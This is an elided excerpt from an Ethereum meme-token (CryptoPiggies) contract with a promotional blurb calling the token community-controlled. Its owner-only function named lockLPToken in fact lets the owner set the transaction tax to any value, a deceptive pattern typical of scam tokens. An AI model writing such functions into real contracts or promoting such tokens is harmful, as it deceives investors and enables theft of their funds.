...
Discover the power of $PIGGIES – join the most fastest growing meme community on the Ethereum, run and controlled by you
...
contract CryptoPiggies is ERC20, Ownable{
    ...
    constructor(address _MarketingWallet) ERC20("CryptoPiggies", "PIGGIES") {
    ...
    function lockLPToken(uint256 _totalTax) external onlyOwner{
        tTax = _totalTax;
    }
